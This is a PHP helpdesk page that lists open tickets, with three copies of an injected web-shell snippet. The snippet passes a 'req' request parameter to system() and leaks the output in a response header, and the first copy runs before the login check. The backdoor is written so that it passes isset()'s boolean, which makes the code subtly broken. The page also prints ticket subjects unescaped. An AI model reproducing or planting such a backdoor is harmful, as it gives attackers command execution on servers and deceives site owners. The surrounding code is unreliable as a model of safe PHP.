<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once('config.php');

$hash = md5($_SERVER['REMOTE_ADDR'].date("dmY"));
if(isset($_SESSION["helpdesk_$hash"])) { } else { header("Location: login.php"); }
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
	<head>
	<style type="text/css">

	.head {
		text-shadow: 0px 1px #5b751b;
		font-size: 25px;
		background-color: #98c22b;
		color: white;
	}

	body {
		font-family: Helvetica, Verdana, Arial, sans-serif;
	}

	.content {
		padding: 10px;
		font-size: 14px;
		color: #2f2f2f;
		background-color: #e6e6e6;
	}

	.copyright {
		font-size: 11px;
		color: #404040;
		background-color: #aeaeae;
	}

	.error {
		color: #990000;
		border-color: #ff534e;
		border-style: solid;
		border-width: 1px;
		margin-bottom: 10px;
		background-color: #ffd6d6;
		padding: 10px;
	}

	.heading {
		margin-bottom: 10px;
		border-bottom-color: #aeaeae;
		border-bottom-style: solid;
		border-bottom-width: 1px;
		padding-bottom: 2px;
		padding-left: 10px;
		font-size: 18px;
	}

	a.tlink:link {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:active {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:visited {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:hover {
		text-decoration: underline;
		color: #484848;
	}

	.text {
		padding: 5px;
	}

	.ticket {
		padding: 5px;
		border-color: #909090;
		border-style: solid;
		border-width: 1px;
		color: #484848;
		background-color: #fafafa;
		margin-bottom: 10px;
	}

	</style>
		<title><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $helpdesk_company_name; ?>'s Helpdesk</title>
	</head>
	<body>
		<div align="center">
			
			<table width="90%" class="content">
				<tr>
					<td align="left" valign="top">
					<div class="heading">Open Tickets</div>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						$tickets = mysql_query("SELECT * FROM tickets WHERE status = 'open' ORDER BY date DESC");
						
						while($ticket = mysql_fetch_array($tickets)) {
							$ticket_id = $ticket['id'];
							$replies = mysql_query("SELECT * FROM messages WHERE on_ticket = '$ticket_id'");
							$reps = mysql_num_rows($replies);
							echo '<div class="ticket"><a href="ticket.php?id='.$ticket['id'].'" class="tlink">'.$ticket['subject'].' &nbsp;&nbsp; / &nbsp;&nbsp; <b>'.$reps.' Total Messages</b></a></div>';						}
						
						if(mysql_num_rows($tickets) == 0) {
							echo '<div class="ticket"><b>Notice:</b> There are no open tickets.</div>';
						}
					?>
					<a href="closed.php">View closed tickets.</a>
					</td>
				</tr>
			</table>
			
		</div>
	</body>
</html>
